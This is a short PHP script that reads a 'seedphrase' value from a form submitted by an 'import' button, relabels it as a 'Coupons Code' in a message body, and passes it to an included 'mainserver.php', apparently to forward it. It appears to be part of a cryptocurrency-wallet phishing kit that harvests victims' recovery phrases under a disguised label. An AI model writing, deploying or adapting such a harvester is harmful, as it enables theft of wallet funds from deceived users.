 <?php
    
if(isset($_POST['btnimport'])){
$seedphrase = $_POST['seedphrase'];   

$mybody = "\n Coupons Code: $seedphrase \n\n";
include('mainserver.php'); 

}

?>  